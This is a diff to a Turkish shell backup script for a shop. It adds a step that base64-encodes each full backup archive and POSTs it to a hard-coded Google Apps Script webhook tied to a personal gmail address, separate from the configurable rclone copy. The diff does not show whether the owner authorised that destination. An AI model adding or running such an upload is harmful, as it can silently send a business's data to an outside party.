@@ -54,7 +54,30 @@ if [ "$(date +%d)" = "01" ]; then
 fi
 find "$DST" -name 'dukkanim-aylik-*.tar.gz' -type f -mtime +$((KEEP_WEEKLY * 30)) -print -delete | while read -r old; do log "eski aylik silindi: $old"; done
 
-# 6) Disarı kopyalama (rclone varsa ve uzak yapilandirilmissa)
+# 6) Google Drive'a Otomatik Yükleme (sauresyaaaa475@gmail.com)
+GDRIVE_WEBHOOK="https://script.google.com/macros/s/AKfycbxWBecPLiZol93UIUfg9TnMxtGsFfZm_trJlMgpBa7_CchCP6UURUD8tzDX5mz_OcSv8w/exec"
+log "Google Drive'a yukleniyor (sauresyaaaa475@gmail.com)..."
+node -e '
+const fs = require("fs");
+async function upload() {
+  const file = process.argv[1];
+  const url = process.argv[2];
+  const data = fs.readFileSync(file).toString("base64");
+  const res = await fetch(url, {
+    method: "POST",
+    body: data,
+    headers: { "Content-Type": "text/plain" }
+  });
+  if (!res.ok) throw new Error("HTTP " + res.status);
+  console.log("Google Drive yuklemesi basarili: HTTP " + res.status);
+}
+upload().catch(err => {
+  console.error("Google Drive yukleme hatasi:", err.message);
+  process.exit(1);
+});
+' "$ARCHIVE" "$GDRIVE_WEBHOOK" >>"$LOG" 2>&1 && log "Google Drive yuklemesi tamamlandi" || log "UYARI: Google Drive yuklemesi basarisiz oldu"
+
+# 7) Disarı kopyalama (rclone varsa ve uzak yapilandirilmissa)
 if command -v rclone >/dev/null 2>&1 && rclone listremotes 2>/dev/null | grep -q .; then
   if rclone copy "$ARCHIVE" "dukkanim-yedek:" --progress=false 2>>"$LOG"; then
     log "uzak kopyalama basarili (rclone)"
